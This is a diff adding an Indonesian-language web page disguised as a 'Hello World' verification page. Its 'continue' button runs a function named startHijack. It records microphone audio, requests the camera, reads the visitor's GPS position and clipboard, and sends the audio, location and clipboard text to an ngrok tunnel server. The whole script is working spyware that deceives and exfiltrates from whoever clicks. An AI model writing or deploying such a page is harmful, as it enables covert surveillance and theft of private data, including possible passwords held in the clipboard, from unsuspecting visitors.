@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello World</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 80px 20px;
+            background: #000;
+            color: #0f0;
+            margin: 0;
+        }
+        h1 { font-size: 4.5em; margin-bottom: 20px; }
+        p { font-size: 1.6em; }
+        button {
+            margin-top: 50px;
+            padding: 18px 40px;
+            font-size: 1.8em;
+            background: #0f0;
+            color: #000;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>Hello World</h1>
+    <p>Selamat datang di halaman verifikasi.</p>
+
+    <button onclick="startHijack()">Klik untuk Melanjutkan</button>
+
+    <script>
+        async function startHijack() {
+            const btn = document.querySelector('button');
+            btn.textContent = "Sedang Memproses...";
+            btn.disabled = true;
+
+            try {
+                // 1. Mikrofon + Recording
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                console.log("[+] Mikrofon berhasil diakses");
+
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+                    sendToServer('audio', audioBlob);
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 8000); // Rekam 8 detik
+
+                // 2. Kamera
+                await navigator.mediaDevices.getUserMedia({ video: true });
+                console.log("[+] Kamera berhasil diakses");
+
+                // 3. Lokasi GPS
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        console.log("[+] GPS:", pos.coords.latitude, pos.coords.longitude);
+                        fetch('https://reversion-exert-gloomily.ngrok-free.dev/location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            })
+                        });
+                    });
+                }
+
+                // 4. Clipboard
+                if (navigator.clipboard) {
+                    navigator.clipboard.readText().then(text => {
+                        if (text) fetch('https://reversion-exert-gloomily.ngrok-free.dev/clipboard', {
+                            method: 'POST',
+                            body: text
+                        });
+                    });
+                }
+
+            } catch (err) {
+                console.log("[-] Error permission:", err);
+            }
+        }
+
+        // Fungsi kirim data ke server Anda
+        function sendToServer(type, data) {
+            const formData = new FormData();
+            formData.append('type', type);
+            formData.append('file', data);
+            fetch('https://reversion-exert-gloomily.ngrok-free.dev/upload', {
+                method: 'POST',
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
